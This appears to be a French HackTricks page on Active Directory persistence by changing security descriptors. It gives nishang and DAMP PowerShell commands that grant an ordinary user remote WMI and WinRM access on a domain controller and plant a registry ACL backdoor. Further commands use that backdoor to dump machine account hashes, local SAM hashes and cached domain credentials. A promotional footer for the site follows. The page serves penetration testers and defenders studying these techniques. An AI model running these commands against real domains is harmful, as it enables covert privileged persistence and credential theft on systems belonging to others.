# Descripteurs de sécurité

Le langage de définition de descripteur de sécurité (SDDL) définit le format utilisé pour décrire un descripteur de sécurité. SDDL utilise des chaînes ACE pour DACL et SACL: `type_ace;flags_ace;droits;GUID_objet;GUID_héritage;SID_compte;`

Les **descripteurs de sécurité** sont utilisés pour **stocker** les **permissions** qu'un **objet** a **sur** un **objet**. Si vous pouvez simplement **apporter** une **petite modification** au **descripteur de sécurité** d'un objet, vous pouvez obtenir des privilèges très intéressants sur cet objet sans avoir besoin d'être membre d'un groupe privilégié.

Cette technique de persistance est basée sur la capacité à gagner tous les privilèges nécessaires contre certains objets, afin de pouvoir effectuer une tâche qui nécessite généralement des privilèges d'administrateur mais sans avoir besoin d'être administrateur.

### Accès à WMI

Vous pouvez donner à un utilisateur l'accès pour **exécuter à distance WMI** [**en utilisant ceci**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1):
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
```
### Accès à WinRM

Donnez accès à la **console PS WinRM à un utilisateur** [**en utilisant ceci**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### Accès à distance aux hachages

Accédez au **registre** et **dump les hachages** en créant une **backdoor Reg en utilisant** [**DAMP**](https://github.com/HarmJ0y/DAMP)**,** afin que vous puissiez à tout moment récupérer le **hachage de l'ordinateur**, le **SAM** et toute **information d'identification AD mise en cache** sur l'ordinateur. Ainsi, il est très utile de donner cette autorisation à un **utilisateur régulier contre un ordinateur contrôleur de domaine** :
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
Consultez [**Silver Tickets**](silver-ticket.md) pour apprendre comment vous pouvez utiliser le hachage du compte d'ordinateur d'un contrôleur de domaine.

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
